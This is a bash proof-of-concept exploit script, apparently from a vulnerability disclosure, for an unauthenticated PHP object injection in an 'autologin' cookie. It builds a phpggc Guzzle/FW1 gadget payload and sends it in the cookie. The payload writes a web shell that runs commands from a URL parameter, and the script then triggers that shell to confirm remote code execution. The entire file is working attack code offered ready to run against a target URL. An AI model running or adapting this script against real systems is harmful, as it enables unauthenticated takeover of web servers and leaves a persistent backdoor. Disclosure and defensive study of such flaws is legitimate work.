#!/usr/bin/env bash
# VULN-01 — Object Injection via autologin cookie (pre-auth RCE)
# Researcher: tal7aouy
# Usage: ./poc.sh https://target/
set -euo pipefail

TARGET="${1:-http://localhost}"
SHELL_PATH="${2:-/var/www/html/pwn.php}"
WEBSHELL='<?php system($_GET["c"]); ?>'

echo "[*] VULN-01 PoC against: $TARGET"

if ! command -v phpggc >/dev/null 2>&1; then
  echo "[!] phpggc not found. Install: git clone https://github.com/ambionics/phpggc"
  echo "    Then re-run this script."
  exit 1
fi

echo "[*] Generating Guzzle/FW1 file-write gadget -> $SHELL_PATH"
PAYLOAD="$(phpggc -u Guzzle/FW1 "$SHELL_PATH" "$WEBSHELL")"

echo "[*] Sending malicious autologin cookie (unauthenticated request)"
curl -sk "$TARGET" -H "Cookie: autologin=${PAYLOAD}" -o /dev/null -w "    HTTP %{http_code}\n"

echo "[*] Attempting to reach the dropped webshell"
BASE="$(echo "$SHELL_PATH" | sed 's#.*/html##')"   # best-effort web path
curl -sk "${TARGET%/}${BASE}?c=id" || true
echo
echo "[*] If 'uid=...' printed above, RCE is confirmed."
